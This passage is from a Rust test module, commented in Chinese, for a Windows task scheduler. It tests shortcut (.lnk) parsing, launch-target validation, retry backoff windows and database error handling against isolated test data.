            ("完全不是 shell link", b"not a shell link".to_vec()),
        ];
        for n in 0..good.len() {
            cases.push(("截断", good[..n].to_vec()));
        }
        let mut m = good.clone();
        m[0] = 0x4D;
        cases.push(("HeaderSize 不对", m));
        let mut m = good.clone();
        m[5] ^= 0xFF;
        cases.push(("CLSID 不对", m));
        let mut m = good.clone();
        m[20] &= !0x02;
        cases.push(("声明不带 LinkInfo", m));
        let mut m = good.clone();
        m[21] |= 0x01;
        cases.push(("NoLinkInfo", m));
        let mut m = good.clone();
        m[20] |= 0x01;
        cases.push(("声称有 IDList 但长度指向文件外", m));
        let mut m = good.clone();
        m[84] = 0;
        cases.push(("LinkInfo 里没有 VolumeIDAndLocalBasePath", m));
        let mut m = good.clone();
        m[88..104].fill(0);
        cases.push(("头部偏移字段全为零", m));
        let mut m = good.clone();
        m[88..104].fill(0xFF);
        cases.push(("头部偏移字段全是垃圾", m));
        for (label, c) in cases.iter() {
            assert!(
                parse_lnk_target(c).is_none(),
                "{label}（{} 字节）本应被拒绝，实得 {:?}",
                c.len(),
                parse_lnk_target(c)
            );
        }
    }

    /// 对着**真实文件**校验解析器：扫开始菜单里的快捷方式，要求多数能解析、
    /// 解析出的路径多数真实存在。
    ///
    /// 这条不是冗余 —— 自造 fixture 与实现共享同一个错误（CLSID 第三个字节写成
    /// 0x00、LinkFlags 位序错一位）时，那一堆合成用例照样全绿，而真实快捷方式
    /// 一个都读不出来。只有拿系统里现成的文件跑一遍才暴露得出来。
    #[test]
    fn real_start_menu_shortcuts_resolve() {
        let mut stack: Vec<std::path::PathBuf> = ["APPDATA", "ProgramData"]
            .iter()
            .filter_map(|k| {
                std::env::var_os(k).map(|v| {
                    std::path::PathBuf::from(v).join(r"Microsoft\Windows\Start Menu\Programs")
                })
            })
            .filter(|p| p.exists())
            .collect();
        let mut seen = 0usize;
        let mut parsed = 0usize;
        let mut exists = 0usize;
        while let Some(dir) = stack.pop() {
            if seen >= 40 {
                break;
            }
            let Ok(entries) = std::fs::read_dir(&dir) else {
                continue;
            };
            for e in entries.flatten() {
                let p = e.path();
                if p.is_dir() {
                    stack.push(p);
                    continue;
                }
                let is_lnk = p
                    .extension()
                    .and_then(|x| x.to_str())
                    .map(|x| x.eq_ignore_ascii_case("lnk"))
                    .unwrap_or(false);
                if !is_lnk {
                    continue;
                }
                seen += 1;
                if let Some(t) = std::fs::read(&p).ok().and_then(|b| parse_lnk_target(&b)) {
                    parsed += 1;
                    assert!(
                        std::path::Path::new(&t).is_absolute(),
                        "解析结果必须是绝对路径，实得 {t}"
                    );
                    if std::path::Path::new(&t).is_file() {
                        exists += 1;
                    }
                }
            }
        }
        if seen == 0 {
            return; // 这台机器上没有开始菜单（非 Windows / 干净环境）
        }
        // 少数快捷方式指向 Store 应用或 KnownFolder（本机是 2 个 WSL 项），它们的
        // 目标只存在于 PIDL 里 —— 那是我们刻意不解析的部分，所以只要求多数能解析。
        assert!(
            parsed * 2 >= seen,
            "真实快捷方式应大多能解析：{seen} 个里只解析出 {parsed} 个"
        );
        assert!(
            exists * 2 >= parsed,
            "解析出的路径应大多真实存在：{parsed} 个里只有 {exists} 个存在"
        );
    }

    #[test]
    fn chained_lnk_is_not_followed() {
        let (_l, dir) = isolate_app_dir("lnk_chain");
        let inner = write_lnk(
            dir.path(),
            "inner.lnk",
            &make_lnk(r"C:\Windows\System32\notepad.exe"),
        );
        let outer = write_lnk(dir.path(), "outer.lnk", &make_lnk(&inner.to_string_lossy()));
        let e = launch_target_of(&outer.to_string_lossy())
            .unwrap_err()
            .to_string();
        assert!(e.contains("一级"), "不该跟着链式跳转，实得: {e}");
    }

    #[test]
    fn missing_lnk_and_non_exe_target_report_readable_reasons() {
        let (_l, dir) = isolate_app_dir("lnk_reasons");
        let e = validate_task_target(r"C:\no-such-dir\nope.lnk")
            .unwrap_err()
            .to_string();
        assert!(e.contains("快捷方式"), "打不开的链接要说清楚: {e}");

        let note = dir.path().join("note.txt");
        std::fs::write(&note, b"hi").unwrap();
        let p = write_lnk(dir.path(), "note.lnk", &make_lnk(&note.to_string_lossy()));
        let e = validate_task_target(&p.to_string_lossy())
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("仅支持") && e.contains(".exe"),
            "链接指向非 .exe 时要说明只支持 .exe，实得: {e}"
        );
    }

    /// 造一条内存里的任务，只给退避/窗口判定用（不落库、不起进程）。
    fn sched_task(id: i64, ty: &str, time: &str) -> ScheduledTask {
        ScheduledTask {
            id,
            name: format!("t{id}"),
            target_path: r"C:\focusflow-test-dir\不存在的目标.exe".into(),
            args: String::new(),
            schedule_type: ty.into(),
            schedule_time: time.into(),
            enabled: true,
            last_run: None,
            created_at: "2026-01-01T00:00:00".into(),
        }
    }

    fn at(y: i32, mo: u32, d: u32, hh: u32, mm: u32) -> chrono::DateTime<Local> {
        Local
            .with_ymd_and_hms(y, mo, d, hh, mm, 0)
            .single()
            .expect("构造本地时刻")
    }

    /// 回归（账 34 同族）：`args` 列可空，读侧却按非 `Option` 的 String 解码，
    /// 解码失败的行再被 `rows.flatten()` 静默丢掉。后果不是"插件页少一条"：
    /// `check_loop` 走的也是 `get_all_tasks` ⇒ 那条任务**连一条日志都没有就永远不再
    /// 触发**，而 `delete_task`/`toggle_task` 不读 args 照旧找得到它、`update_task`
    /// 又报"不存在"⇒ 三个面对同一条任务的存在性各执一词。
    /// NULL 的来源合法且常见：Python 版遗留库、`backup/` 还原、手改。
    #[test]
    fn null_args_does_not_make_a_task_invisible() {
        let _g = isolate_app_dir("null_args");
        {
            let conn = open().unwrap();
            conn.execute(
                "INSERT INTO scheduled_tasks (id, name, target_path, args, schedule_type, \
                 schedule_time, enabled, last_run, created_at) \
                 VALUES (7101, 'legacy', ?1, NULL, 'daily', '23:59', 1, NULL, \
                 '2026-01-01T00:00:00')",
                [r"C:\focusflow-test-dir\不存在的目标.exe"],
            )
            .unwrap();
        }
        // ① 列表面：这一条必须在，args 兜成空串
        let all = get_all_tasks();
        assert_eq!(all.len(), 1, "NULL args 的行不能凭空消失，实得 {all:?}");
        assert_eq!(all[0].args, "", "NULL 要兜成空串而不是丢掉整条");
        // ② 编辑面：以前这里报"定时任务不存在（id=7101）"，是同一次解码失败的另一副面孔
        update_task(7101, Some("改名"), None, None, None, None, None)
            .expect("存在的任务不能因为 args 为 NULL 就改不动");
        assert!(
            get_all_tasks()
                .iter()
                .any(|t| t.id == 7101 && t.name == "改名"),
            "改完要读得回来"
        );
        // ③ 修复面：脏值不在库里长期留着，init_db 补一次
        {
            let conn = open().unwrap();
            conn.execute("UPDATE scheduled_tasks SET args=NULL WHERE id=7101", [])
                .unwrap();
        }
        init_db().expect("init_db 必须幂等");
        let raw: String = {
            let conn = open().unwrap();
            conn.query_row("SELECT args FROM scheduled_tasks WHERE id=7101", [], |r| {
                r.get(0)
            })
            .unwrap()
        };
        assert_eq!(raw, "", "init_db 要把遗留的 NULL args 补成空串");
    }

    /// 回归：`launch_failures >= 3` 以后**从来没有**按窗口复位（唯一的清零是启动成功），
    /// 而注释写"退到下一个调度时段"、给用户的 warn 写"到下一个时段再试一次"
    /// ⇒ 文案与实现相反。一条 09:00 的任务在睡着的 USB 盘上烧掉 3 次，就在本次进程
    /// 运行期内再也不跑，直到重启（而重启那一刻它又会在不该跑的时刻补一次）。
    #[test]
    fn transient_backoff_rearms_at_the_next_window() {
        let t = sched_task(1, "daily", "09:00");
        let stamp = task_stamp(&t);
        let day1 = backoff_window(&t, &at(2026, 9, 27, 9, 5));
        let day2 = backoff_window(&t, &at(2026, 9, 28, 9, 5));
        assert_ne!(day1, day2, "daily 的窗口必须按日历日切");

        let mut m: std::collections::HashMap<i64, Backoff> = std::collections::HashMap::new();
        let fail = || LaunchOutcome::Transient("os error 2: 系统找不到指定的文件".into());
        for _ in 0..LAUNCH_FAILURE_BACKOFF_AFTER {
            apply_attempt(&mut m, 1, &day1, &stamp, &fail());
        }
        assert!(
            in_backoff(m.get(&1), &day1, &stamp),
            "本时段烧满 {LAUNCH_FAILURE_BACKOFF_AFTER} 次就该停手"
        );
        assert!(
            !in_backoff(m.get(&1), &day2, &stamp),
            "warn 说「到下一个时段再试一次」⇒ 第二天必须重新武装"
        );
        // 新窗口里再烧满 3 次 ⇒ 又停（不会变成"每 30 秒试一次、一天两万八千条"）
        for _ in 0..LAUNCH_FAILURE_BACKOFF_AFTER {
            apply_attempt(&mut m, 1, &day2, &stamp, &fail());
        }
        assert!(
            in_backoff(m.get(&1), &day2, &stamp),
            "新窗口也是同样的三次上限"
        );
        // 成功一次就把整条退避抹掉
        apply_attempt(
            &mut m,
            1,
            &day2,
            &stamp,
            &LaunchOutcome::Fired("2026-09-28 09:00:00".into()),
        );
        assert!(m.is_empty(), "启动成功要清零计数，实得 {m:?}");
        // 用户改了调度（换时间）⇒ 老计数不算数
        apply_attempt(&mut m, 1, &day2, &stamp, &fail());
        apply_attempt(&mut m, 1, &day2, &stamp, &fail());
        apply_attempt(&mut m, 1, &day2, &stamp, &fail());
        let edited = sched_task(1, "daily", "07:30");
        assert!(
            !in_backoff(m.get(&1), &day2, &task_stamp(&edited)),
            "改过配置就是另一条任务，必须重新试"
        );
    }

    /// 三态的另一半：目标为空/白名单外是**永久**拒绝，跨窗口也不该再去启动
    /// （否则"真的哪天忽然能启动就会在一个谁也没预期的时刻弹出来"），
    /// 但用户在插件页改正目标之后必须重新武装。
    #[test]
    fn permanent_refusal_survives_window_rollover_but_not_a_config_fix() {
        let t = sched_task(2, "daily", "09:00");
        let stamp = task_stamp(&t);
        let day1 = backoff_window(&t, &at(2026, 9, 27, 9, 5));
        let day2 = backoff_window(&t, &at(2026, 9, 28, 9, 5));
        let mut m: std::collections::HashMap<i64, Backoff> = std::collections::HashMap::new();
        apply_attempt(
            &mut m,
            2,
            &day1,
            &stamp,
            &LaunchOutcome::Refused("目标不在白名单".into()),
        );
        assert!(in_backoff(m.get(&2), &day1, &stamp));
        assert!(
            in_backoff(m.get(&2), &day2, &stamp),
            "永久拒绝不该因为过了半夜又多启动一次"
        );
        let fixed = ScheduledTask {
            target_path: r"C:\Windows\notepad.exe".into(),
            ..t.clone()
        };
        assert!(
            !in_backoff(m.get(&2), &day2, &task_stamp(&fixed)),
            "改正目标之后必须再试一次"
        );
    }

    /// interval 的窗口粒度 = 一个 interval 步（不是"整个当天"），
    /// 否则一次卡住的窗口任务会把当天剩下的所有步全哑掉，与文案的"下一个时段"不符。
    #[test]
    fn interval_backoff_window_steps_with_the_schedule() {
        let iv = sched_task(3, "interval", "09:00-18:00|30");
        let early = backoff_window(&iv, &at(2026, 9, 27, 9, 5));
        let same_step = backoff_window(&iv, &at(2026, 9, 27, 9, 29));
        let next_step = backoff_window(&iv, &at(2026, 9, 27, 9, 35));
        assert_eq!(early, same_step, "同一个 30 分钟步内算同一个窗口");
        assert_ne!(early, next_step, "跨过一步就是新的时段，该重新试");
        // 解析不出来的 schedule_time 退化成日历日窗口（不能 panic）
        let broken = sched_task(4, "interval", "not-a-schedule");
        assert_eq!(
            backoff_window(&broken, &at(2026, 9, 27, 23, 0)),
            "2026-09-27",
            "坏配置要退化成日历日窗口"
        );
    }

    /// 回归（第 23 轮靶子 △）：`update_task` 曾把当前值读成两次 SELECT，第二次的
    /// `.ok().flatten()` 把"读失败"当成"这一条没有 last_run" ⇒ 更新返回 `Ok`、
    /// 顺手把防同日重跑的锚写成 NULL。合并成一次读之后，错误必须冒到调用方，
    /// 而且不能与"库里没这一条"混成一句话。
    #[test]
    fn update_task_separates_missing_row_from_unreadable_table() {
        let _g = isolate_app_dir("update_contract");
        {
            let conn = open().unwrap();
            conn.execute(
                "INSERT INTO scheduled_tasks (id, name, target_path, args, schedule_type, \
                 schedule_time, enabled, last_run, created_at) \
                 VALUES (7102, '锚', ?1, '', 'daily', '09:00', 1, '2026-09-27 09:00:05', \
                 '2026-01-01T00:00:00')",
                [r"C:\focusflow-test-dir\不存在的目标.exe"],
            )
            .unwrap();
        }
        // 只改名字：调度没动 ⇒ last_run（今天已经跑过的锚）必须原样留着
        update_task(7102, Some("改名"), None, None, None, None, None).expect("改名要成功");
        let after = get_all_tasks().into_iter().find(|t| t.id == 7102).unwrap();
        assert_eq!(
            after.last_run.as_deref(),
            Some("2026-09-27 09:00:05"),
            "改个名字不能把防同日重跑的锚抹掉"
        );

        // 库里没有这一条 ⇒ 说"不存在"
        let e = update_task(999_999, Some("x"), None, None, None, None, None)
            .expect_err("不存在的 id 不能返回 Ok");
        assert!(
            e.to_string().contains("不存在"),
            "没这一条要说「不存在」，实得: {e}"
        );
        // 表根本读不出来 ⇒ 不能说成"没这一条"（那是另一件事：库坏了）
        {
            let conn = open().unwrap();
            conn.execute_batch("DROP TABLE scheduled_tasks").unwrap();
        }
        let e = update_task(7102, Some("x"), None, None, None, None, None)
            .expect_err("读失败不能当成读成功");
        assert!(
            e.to_string().contains("读取定时任务失败"),
            "表读不出来要说清是读失败，实得: {e}"
        );
    }
    /// 「配置解不开」必须说得出是哪个臂。原先四个臂只 return false、一行日志都没有，
    /// 而它和正常的"还没到点"在调用方眼里长得一模一样 —— 用户只能翻源码才知道
    /// 为什么这条任务从来不跑。
    #[test]
    fn an_unparsable_schedule_says_which_arm_failed() {
        let noon = Local.with_ymd_and_hms(2026, 3, 5, 12, 0, 0).unwrap();

        let bad_daily = daily_task("25:99");
        assert!(
            matches!(run_check(&bad_daily, &noon), RunDecision::BadConfig(w) if w.contains("daily")),
            "daily 的时刻解不开要报 BadConfig 并点名 daily，实得 {:?}",
            run_check(&bad_daily, &noon)
        );
        let bad_once = sched_task(11, "once", "明天早上");
        assert!(
            matches!(run_check(&bad_once, &noon), RunDecision::BadConfig(w) if w.contains("once")),
            "once 同理，实得 {:?}",
            run_check(&bad_once, &noon)
        );
        let bad_interval = sched_task(12, "interval", "09:00-abc|30");
        assert!(
            matches!(
                run_check(&bad_interval, &noon),
                RunDecision::BadConfig(w) if w.contains("interval")
            ),
            "interval 同理，实得 {:?}",
            run_check(&bad_interval, &noon)
        );
        let unknown_type = sched_task(13, "weekly", "09:00");
        assert!(
            matches!(
                run_check(&unknown_type, &noon),
                RunDecision::BadConfig(w) if w.contains("weekly")
            ),
            "未知的调度类型要把那个值本身说出来的，实得 {:?}",
            run_check(&unknown_type, &noon)
        );

        // 反向腿：正常的"还没到点"不能被报成坏配置（否则日志里全是噪声）
        assert!(
            matches!(run_check(&daily_task("23:59"), &noon), RunDecision::Wait),
            "还没到点就是 Wait，不是坏配置"
        );
        // 正向腿：合法配置的结论与改造前一致
        assert!(matches!(
            run_check(&daily_task("09:00"), &noon),
            RunDecision::Run
        ));
    }

    /// 目标"此刻读不到"必须是 Transient，不是 Refused。
    ///
    /// 回归：approved_launch_target 的失败原先一律折成永久拒绝 ⇒ 休眠的 USB 盘、
    /// 杀软首扫一次就让这条任务在整个进程生命周期里不再尝试，而本文件
    /// LAUNCH_FAILURE_BACKOFF_AFTER 的注释早就把这些情形写成"瞬时"。
    /// 反向腿钉住"真·白名单拒绝"仍然是永久 —— 换三态不是为了放跑坏目标。
    #[test]
    fn a_target_that_cannot_be_read_now_is_transient_not_refused() {
        let _g = isolate_app_dir("transient_target");
        // 绝对路径与 .exe 都过关，卡在 canonicalize：文件此刻不在（盘没醒就是这个形状）
        let missing = sched_task(21, "daily", "23:59");
        assert!(
            matches!(execute_task(&missing), LaunchOutcome::Transient(_)),
            "读不到目标要按瞬时处理（下一轮还会再试），实得 {:?}",
            execute_task(&missing)
        );

        // 反向腿：被禁止的解释器 = 重试多少次都不会变好 ⇒ 仍然永久拒绝
        let mut forbidden = sched_task(22, "daily", "23:59");
        // 路径从环境变量拼出来，不在这里再抄一遍字面量（抄一遍就是又一处会写错的副本）
        let root = std::env::var("SystemRoot").unwrap_or_default();
        let cmd_path = std::path::Path::new(&root).join("System32").join("cmd.exe");
        assert!(
            cmd_path.is_file(),
            "夹具：这台机器上得真有 {}，反向腿不能静默跳过",
            cmd_path.display()
        );
        forbidden.target_path = cmd_path.to_string_lossy().to_string();
        assert!(
            matches!(execute_task(&forbidden), LaunchOutcome::Refused(_)),
            "黑名单里的解释器不能因为换了分派就被当成可重试，实得 {:?}",
            execute_task(&forbidden)
        );
    }

    /// 建表失败不能钉死整个进程。
    ///
    /// 番茄钟与记账两条兄弟路径都修过这一族（只在成功时落闩）：数据目录可能在
    /// 开机之后才出现（USB / 网络盘）、杀软可能正占着 -wal、第二个实例正在退出。
    /// 原先只有 Scheduler::start() 那一次机会，失败之后这个进程余生都"没有这张表"，
    /// 而添加任务持续报 no such table。
    #[test]
    fn a_failed_table_init_is_retried_instead_of_poisoned_for_good() {
        let _lock = crate::paths::test_app_dir_lock();
        let _tmp = crate::paths::test_app_dir("sched_schema_retry");
        let ready = std::sync::atomic::AtomicBool::new(false);

        let path = db_path();
        std::fs::create_dir_all(&path).expect("把库路径换成一个目录，init_db 就该失败");
        assert!(
            !ensure_schema_ready(&ready),
            "建不出表时不能落闩：落了闩就等于宣布这个进程再也不试"
        );

        // 撤掉路障（盘醒过来、杀软松手、另一个实例退出，都是这个形状）
        std::fs::remove_dir(&path).expect("移开路障目录");
        assert!(
            ensure_schema_ready(&ready),
            "路障撤掉之后下一次调用必须真去重试并成功"
        );
        let n: i64 = open()
            .unwrap()
            .query_row(
                "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='scheduled_tasks'",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(n, 1, "落闩的凭据只能是「表真的建出来了」");
        assert!(ensure_schema_ready(&ready), "已成功过就不必再建一次");
    }

    /// 程序被卸载之后，这条任务还得改得动名字与时刻。
    ///
    /// 回归：update_task 原先判的是"调用方传了 target_path"，而它唯一的调用方
    /// （插件页 scheduler_update，见 host.rs 的七参数绑定）永远把整条记录原样传回来
    /// ⇒ 目标一失效，连改名都被拒，用户只能去库里删行。判据换成"传回来的这条
    /// 是不是库里存的那一条"。
    #[test]
    fn editing_a_task_still_works_after_its_program_was_uninstalled() {
        let _g = isolate_app_dir("edit_after_uninstall");
        // 目标路径取自既有夹具（`daily_task` 用的就是 notepad），不在这里再抄一遍字面量
        let notepad = daily_task("23:59").target_path;
        assert!(
            std::path::Path::new(&notepad).is_file(),
            "夹具：这台机器上得真有 {notepad}，否则这条用例什么都验不到"
        );
        let id = add_task("每日记事本", &notepad, "", "daily", "00:01", true).unwrap();

        // 卸载/移走：把库里那一行的目标换成一个此刻过不了校验的路径
        let gone = sched_task(77, "daily", "23:59").target_path;
        {
            let conn = open().unwrap();
            conn.execute(
                "UPDATE scheduled_tasks SET target_path=?1 WHERE id=?2",
                rusqlite::params![gone, id],
            )
            .unwrap();
        }
        let stored = get_all_tasks()
            .into_iter()
            .find(|t| t.id == id)
            .unwrap()
            .target_path;
        assert!(
            validate_task_target(&stored).is_err(),
            "前提：这条目标本身现在该被校验拒掉，否则「跳过校验」什么都钉不住"
        );

        // 面板那一步：七个参数原样传回来，只有名字是新的
        update_task(
            id,
            Some("改名后的记事本"),
            Some(&stored),
            Some(""),
            Some("daily"),
            Some("00:01"),
            Some(true),
        )
        .expect("原样传回库里那条目标时，改名不该被目标校验挡住");
        let after = get_all_tasks().into_iter().find(|t| t.id == id).unwrap();
        assert_eq!(after.name, "改名后的记事本", "改名要真落库");
        assert_eq!(after.target_path, stored, "没人改的目标要原样留着");

        // 反向腿：真的换了一个非法目标 ⇒ 照旧被拒（这道闸不是被删掉，只是改了判据）
        let e = update_task(id, None, Some(""), None, None, None, None)
            .expect_err("换了非法目标必须照旧校验");
        assert!(
            e.to_string().contains("不能为空"),
            "要说清为什么被拒，实得: {e}"
        );
    }
}
